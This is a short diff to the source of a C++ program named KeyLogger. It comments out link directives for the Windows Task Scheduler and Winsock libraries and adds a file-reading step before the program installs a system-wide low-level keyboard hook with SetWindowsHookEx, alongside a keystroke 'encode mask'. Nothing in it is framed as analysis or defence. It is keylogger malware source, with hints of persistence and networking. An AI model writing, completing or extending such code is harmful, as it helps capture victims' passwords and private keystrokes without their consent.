@@ -14,8 +14,8 @@
 
 #include <shlobj.h> // For SHGetFolderPath
 
-#pragma comment(lib, "taskschd.lib")
-#pragma comment(lib, "Ws2_32.lib")
+//#pragma comment(lib, "taskschd.lib")
+//#pragma comment(lib, "Ws2_32.lib")
 
 #define ASSERT(condition, ...)\
 		if(!(condition)) {\
@@ -53,6 +53,7 @@ void KeyLogger::Init()
 #endif
 */
 	s_EncodeMask = 0x3F3E; // Set Encode mask
+	ReadFromFile();
 	s_KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardCallback, GetModuleHandle(NULL), 0); // Set keyboard Hook
 	if (s_KeyboardHook)
 		std::cout << "Hook set" << std::endl;
